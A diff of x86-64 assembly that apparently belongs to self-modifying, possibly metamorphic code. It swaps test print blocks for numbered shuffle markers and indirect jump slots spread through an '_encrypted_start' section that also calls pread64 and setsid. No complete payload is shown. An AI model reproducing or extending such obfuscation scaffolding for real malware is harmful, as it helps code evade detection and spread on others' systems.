@@ -13,86 +13,19 @@ _encrypted_start:
 	.addr0r: dq 0
 	start_shuffle:
 
+
+
+
+
+
+
+
+
+
+
+
 	; BLOC 0
 	dq	1942, 0
-	bloc0:
-	mov	rax, 1
-	mov	rdi, 1
-	jmp	msg0
-	db  'SALUT'
-	db 	'0', 10, 0
-	msg0:
-	lea	rsi, [rel msg0 - 3]
-	mov	rdx, 2
-	syscall
-	jmp	[rel .addr1r]
-	.addr1: dq 0x421900000001
-	.addr1r: dq 0
-	dq 0x696900000001
-
-
-	; BLOC 1
-	dq	1942, 1
-	bloc1:
-	mov	rax, 1
-	mov	rdi, 1
-	jmp	msg1
-	db  'BONJOUR'
-	db 	'1', 10, 0
-	msg1:
-	lea	rsi, [rel msg1 - 3]
-	mov	rdx, 2
-	syscall
-	jmp	[rel .addr2r]
-	.addr2: dq 0x421900000002
-	.addr2r: dq 0
-	dq 0x696900000002
-
-
-	; BLOC 2
-	dq	1942, 2
-	bloc2:
-	mov	rax, 1
-	mov	rdi, 1
-	jmp	msg2
-	db  'AHAHAH'
-	db 	'2', 10, 0
-	msg2:
-	lea	rsi, [rel msg2 - 3]
-	mov	rdx, 2
-	syscall
-	jmp	[rel .addr3r]
-	.addr3: dq 0x421900000003
-	.addr3r: dq 0
-	dq 0x696900000003
-
-	; BLOC 2
-	dq	1942, 3
-	bloc3:
-	mov	rax, 1
-	mov	rdi, 1
-	jmp	msg3
-	db  'AHAHAH'
-	db 	'3', 10, 0
-	msg3:
-	lea	rsi, [rel msg3 - 3]
-	mov	rdx, 3
-	syscall
-	jmp	[rel .addr4r]
-	.addr4: dq 0x421900000004
-	.addr4r: dq 0
-	dq 0x696900000004
-
-
-
-
-	end_shuffle:
-	dq	1942, 4
-	end_code:
-
-
-
-
 	mov		rdi, [rbp + 16]
 	add		rdi, mydata.path
 
@@ -131,10 +64,13 @@ _encrypted_start:
 	inc		rax
 	mov		[rax], byte '/'
 	inc		rax
-	; bloc 0
+	jmp	[rel .addr1r]
+	.addr1: dq 0x421900000001
+	.addr1r: dq 0
+	dq 0x696900000001
 
 
-
+	dq	1942, 1
 
 	mov		rax, [rbp + 8]
 	;lea		rax, [rel _start]
@@ -157,7 +93,12 @@ _encrypted_start:
 	NOP
 	syscall
 	cmp		rax, 0
-
+	jmp	[rel .addr2r]
+	.addr2: dq 0x421900000002
+	.addr2r: dq 0
+	dq 0x696900000002
+	end_shuffle0:
+	dq	1942, 2
 	jle		.just_quit
 	mov		r12, rax
 	mov		rax, SYS_pread64
@@ -175,7 +116,12 @@ _encrypted_start:
 	syscall
 
 	POP_ALL
-
+	jmp	[rel .addr3r]
+	.addr3: dq 0x421900000003
+	.addr3r: dq 0
+	dq 0x696900000003
+	end_shuffle1:
+	dq	1942, 3
 
 
 	mov		rax, [rbp + 16]
@@ -233,3 +179,9 @@ _encrypted_start:
 	mov		rax, SYS_setsid
 	syscall
 .continue:
+	jmp	[rel .addr4r]
+	.addr4: dq 0x421900000004
+	.addr4r: dq 0
+	dq 0x696900000004
+	end_shuffle2:
+	dq	1942, 4
